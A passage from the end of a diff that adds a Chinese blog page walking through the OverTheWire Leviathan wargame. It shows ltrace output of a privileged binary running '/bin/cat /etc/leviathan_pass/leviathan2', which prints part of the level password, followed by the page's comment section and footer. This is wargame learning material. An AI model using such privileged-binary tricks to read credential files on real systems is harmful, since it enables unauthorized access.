+snprintf<span class="o">(</span><span class="s2">&quot;/bin/cat /etc/leviathan_pass/lev&quot;</span>...,<span class="w"> </span><span class="m">511</span>,<span class="w"> </span><span class="s2">&quot;/bin/cat %s&quot;</span>,<span class="w"> </span><span class="s2">&quot;/etc/leviathan_pass/leviathan2&quot;</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">39</span>
+system<span class="o">(</span><span class="s2">&quot;/bin/cat /etc/leviathan_pass/lev&quot;</span>...ougahZi8Ta
+<span class="w"> </span>&lt;no<span class="w"> </span><span class="k">return</span><span class="w"> </span>...&gt;
+---<span class="w"> </span>SIGCHLD<span class="w"> </span><span class="o">(</span>Child<span class="w"> </span>exited<span class="o">)</span><span class="w"> </span>---
+&lt;...<span class="w"> </span>system<span class="w"> </span>resumed&gt;<span class="w"> </span><span class="o">)</span><span class="w">                                                            </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
++++<span class="w"> </span>exited<span class="w"> </span><span class="o">(</span>status<span class="w"> </span><span class="m">0</span><span class="o">)</span><span class="w"> </span>+++
+</pre></div>
+</div>
+<p>元旦快乐，希望新的一年不要那么痛苦了。</p>
+<div class="sd-card sd-sphinx-override sd-mb-3 sd-shadow-sm docutils">
+<div class="sd-card-body docutils">
+<div class="sd-card-title sd-font-weight-bold docutils">
+评论</div>
+<p class="sd-card-text">如果你有任何意见，请在此评论。
+如果你留下了电子邮箱，我可能会通过 <script type="text/javascript">document.write(
+    "<n pynff=\"ersrerapr rkgreany\" uers=\"znvygb:pbzzragf\100fvyireenvam\056zr\">pbzzragf\100fvyireenvam\056zr<\057n>".replace(/[a-zA-Z]/g,
+        function(c){
+            return String.fromCharCode(
+                (c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26
+            );
+        }
+    )
+);</script> 回复你。</p>
+<section data-isso-id="/blog/overthewire-leviathan" data-title="OverTheWire Leviathan" id="isso-thread"></section></div>
+</div>
+</section>
+
+<div class="section ablog__blog_comments">
+  
+  
+
+
+<div class="section ablog__prev-next">
+  <span class="ablog__prev">
+    
+    
+    <a href="gen-graph-from-c-code.html">
+      
+      <i class="fa fa-arrow-circle-left"></i>
+      
+      <span>从 C 源码生成 函数/模块 调用图</span>
+    </a>
+    
+  </span>
+  <span class="ablog__spacer">&nbsp;</span>
+  <span class="ablog__next">
+    
+    
+    <a href="get-teeworlds-server-information.html">
+      <span>获取 teeworlds 服务器信息</span>
+      
+      <i class="fa fa-arrow-circle-right" ></i>
+      
+    </a>
+    
+  </span>
+</div>
+
+  
+  
+</div>
+
+                </article>
+              
+
+              
+              
+                <footer class="bd-footer-article">
+                  
+<div class="footer-article-items footer-article__inner">
+  
+    <div class="footer-article-item"><!-- Previous / next buttons -->
+<div class="prev-next-area">
+</div></div>
+  
+</div>
+
+                </footer>
+              
+            </div>
+            
+            
+              
+            
+          </div>
+          <footer class="bd-footer-content">
+            
+<div class="bd-footer-content__inner container">
+  
+  <div class="footer-item">
+    
+<p class="component-author">
+作者： Shengyu Zhang
+</p>
+
+  </div>
+  
+  <div class="footer-item">
+    
+  <p class="copyright">
+    
+      © Copyright 2020-2022, Shengyu Zhang.
+      <br/>
+    
+  </p>
+
+  </div>
+  
+  <div class="footer-item">
+    <p class="last-updated">
+  最后更新于 2023-04-09.
+  <br/>
+</p>
+  </div>
+  
+  <div class="footer-item">
+    
+  </div>
+  
+</div>
+          </footer>
+        
+
+      </main>
+    </div>
+  </div>
+  
+  <!-- Scripts loaded after <body> so the DOM is not blocked -->
+  <script src="../_static/scripts/bootstrap.js?digest=e353d410970836974a52"></script>
+<script src="../_static/scripts/pydata-sphinx-theme.js?digest=e353d410970836974a52"></script>
+
+  <footer class="bd-footer">
+  </footer>
+  </body>
+</html>
